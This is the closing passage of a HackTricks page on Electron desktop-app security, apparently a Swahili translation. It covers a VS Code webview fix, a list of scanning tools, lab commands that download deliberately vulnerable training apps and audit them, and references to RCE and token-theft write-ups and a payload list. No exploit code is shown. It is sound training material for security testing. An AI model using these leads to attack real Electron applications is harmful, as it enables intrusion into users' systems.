- Marekebisho ya Juni 3, 2026 yaliongeza `isTrusted` kwenye matukio yanayosambazwa, yalizima usambazaji wa vitufe visivyoaminika kwenye notebook webviews, na yakaacha kukubali muktadha wa amri ya usakinishaji uliotolewa na mpigaji.<sup>[[16]](#references)[[17]](#references)</sup>

## **Zana**

Mkusanyiko ulioratibiwa wa **awesome-electronjs-hacking** una nyenzo zaidi za utafiti, zana, na programu zilizo hatarini.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) ni zana ya kutambua usanidi usio sahihi na mifumo inayokiuka usalama katika programu zinazotumia Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) ni plugin ya VS Code ya open source kwa programu za Electron inayotumia Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) hukagua maktaba za wahusika wengine zilizo hatarini.
- [**Electro.ng**](https://electro.ng/) ni zana ya kibiashara ya uchanganuzi wa usalama wa Electron.

## Maabara

Katika [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) unaweza kupata maabara ya kutumia vibaya programu za Electron zilizo hatarini.<sup>[[4]](#references)</sup>

Amri hizi zitakusaidia kufanya mazoezi katika maabara:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Anwani iliyochapishwa awali kwa alamisho zilizopo: [Programu za desktop za Electron](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Njia ya ukurasa mzima inaelekeza hapa; fragment ya kihistoria haitunzwa.

## References

- [1] [Phishing na credential harvesting katika programu za Electron](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Facebook Messenger Desktop App: Usomaji Holela wa Faili](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: Kutumia vibaya ukosefu wa context isolation - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Warsha ya Hacking programu za kisasa za desktop kwa kutumia XSS na RCE](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - orodha teule ya rasilimali kuhusu usalama (na ukosefu wake) wa Electron.js](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Matumizi Mabaya ya Electron APIs: Chaguo la Kwanza la Mshambuliaji](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Electron nodeIntegration RCE payloads](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE ya kubofya mara moja katika Programu za Electron](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Hatari za shell.openExternal() ya Electron - njia nyingi za kutekeleza msimbo kwa mbali](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Ruhusu URL zozote, tarajia utekelezaji wa msimbo wowote](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [Kupata RCE katika zana maarufu ya mazungumzo ya Kijapani kwa kutumia kipengele cha zamani cha Electron](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - Utekelezaji wa Msimbo kwa Mbali](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - Utekelezaji wa Msimbo kwa Mbali katika Hali yenye Vikwazo (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [Wizi wa Tokeni ya GitHub kwa Mbofyo Mmoja kupitia Uingizaji wa Matukio ya Kibodi kwenye VS Code Webview](https://blog.ammaraskar.com/github-token-stealing)
- [15] [Suala la VS Code #319593: Webviews zinaweza kuanzisha mikato yoyote ya kibodi kwenye workbench kuu](https://github.com/microsoft/vscode/issues/319593)
- [16] [VS Code PR #319705: thibitisha ufunguzi wa notebook na uache kukubali muktadha wa installExtension unaotolewa na mwitaji](https://github.com/microsoft/vscode/pull/319705)
- [17] [VS Code PR #319813: zuia kutumwa upya kwa kubofya/kubonyeza vitufe kwa njia ya programu kwenye notebook webviews](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / viendelezi vya workspace za ndani](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: Jinsi Nilivyohack Kila IDE Kuu kwa Wiki 2](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Kumiliki Programu Maarufu za Desktop Huku Nikifichua Eneo Jipya la Mashambulizi kwenye Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Usalama wa Electron](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: Reverse Engineer Anything](https://github.com/morluto/rea)
- [24] [Uundaji upya wa vizalia vya JavaScript kwa REA](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [Mtiririko wa kazi wa programu za JavaScript katika tabaka mbalimbali kwa REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
